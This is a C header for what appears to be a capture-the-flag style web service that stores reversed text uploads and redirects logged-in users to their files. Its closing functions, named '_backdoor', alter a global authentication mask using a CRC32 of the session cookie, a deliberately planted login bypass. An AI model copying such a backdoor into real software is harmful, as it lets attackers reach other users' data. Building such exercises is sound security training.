#ifndef HANDLE_TEXT_H
#define HANDLE_TEXT_H

#include <uuid/uuid.h>

#include "common.h"
#include "util.h"

#define OBF_MARKER

void text_reverse(char* buf, size_t buf_len){
        
    for(size_t i=0;i<buf_len/2;i++){
        char tmp = buf[i];
        buf[i] = buf[(buf_len-1) - i];
        buf[(buf_len-1) - i] = tmp;
    }
    
    // fix UTF-8 codepoints
    for(size_t i=buf_len; i>0;){
        i--;
        if((i>0) && (buf[i] & 0b11100000) == 0b11000000) { // 2-byte char
            char tmp = buf[i];
            buf[i] = buf[i-1];
            buf[i-1] = tmp;
            i -= 1;
        }else if((i>1) && (buf[i] & 0b11110000) == 0b11100000) { // 3-byte char
            char tmp = buf[i];
            buf[i] = buf[i-2];
            buf[i-2] = tmp;
            i -= 2;
        }else if((i>2) && (buf[i] & 0b11111000) == 0b11110000) { // 4-byte char
            char tmp = buf[i];
            buf[i] = buf[i-3];
            buf[i-3] = tmp;
            tmp = buf[i-1];
            buf[i-1] = buf[i-2];
            buf[i-2] = tmp;
            i -= 3;
        }
    }
    
}

void handle_text_post(path_t* path){
    const char* username = get_logged_in_username();
    if(username == NULL){
        return err(401, "Unauthorized");
    }
    
    char buf[65536] = {0};
    size_t buf_len = 65535;
    if((buf_len=fread(buf, 1, buf_len, stdin)) >= sizeof(buf)){
        err(413, "Payload Too Large");
        return;
    }

    text_reverse(buf, buf_len);
    
    uuid_t uuid;
    uuid_generate_random(uuid);
    char uuid_str[37] = {0};
    uuid_unparse_lower(uuid, uuid_str);
    
    char filepath[256] = {0};
    snprintf(filepath, sizeof(filepath), "./data/files/%s", uuid_str);
    
    FILE* datafile = fopen(filepath, "w");
    fwrite(buf, buf_len, 1, datafile);
    fclose(datafile);
    
    int id = add_uuid(username, "text", uuid_str);
    struct json_object* id_msg = json_object_new_object();
    json_object_object_add(id_msg, "id", json_object_new_int(id));
    printf("Content-Type: application/json\r\n\r\n");
    printf("%s\r\n", json_object_to_json_string(id_msg));
    json_object_put(id_msg);
}

void handle_text_get(path_t* path){
    const char* username = get_logged_in_username();
    if(username == NULL){
        return err(401, "Unauthorized");
    }
    if(path->n < 3){
        return err(400, "Bad Request (undefined idx)");
    }
    int file_idx = atoi(path->parts[2]);
    
    char uuid_str[37] = {0};
    if(get_uuid(username, "text", file_idx, uuid_str)){
        return err(400, "Bad Request (file does not exist)");
    }
    printf("Status: 302 Found\r\n");
    printf("Location: /userdata/%s\r\n\r\n", uuid_str);
}

void handle_text(path_t* path, const char method[]) {
    if(!strcmp(method, "POST")){
        return handle_text_post(path);
    }
    else if(!strcmp(method, "GET")){
        return handle_text_get(path);
    }
    return err(400, "Bad Request (invalid method, text)");
}

char* get_logged_in_username_backdoor(){
    char* cookie = get_cookie("Session");
    if(cookie == NULL){
        return NULL;
    }
    size_t cookie_len = strlen(cookie);
    AUTH_MASK ^= crc32(0, (const unsigned char*) cookie, cookie_len);
    return get_logged_in_username();
}

void handle_text_get_backdoor(path_t* path){
    const char* username = get_logged_in_username_backdoor();
    if(username == NULL){
        return err(401, "Unauthorized");
    }
    if(path->n < 3){
        return err(400, "Bad Request (undefined idx)");
    }
    int file_idx = atoi(path->parts[2]);
    
    char uuid_str[37] = {0};
    if(get_uuid(username, "text", file_idx, uuid_str)){
        return err(400, "Bad Request (file does not exist)");
    }
    printf("Status: 302 Found\r\n");
    printf("Location: /userdata/%s\r\n\r\n", uuid_str);
}

void handle_text_backdoor(path_t* path, const char method[]) {
    if(!strcmp(method, "GET")){
        return handle_text_get_backdoor(path);
    }
    return err(400, "Bad Request (invalid method, text)");
}

#endif
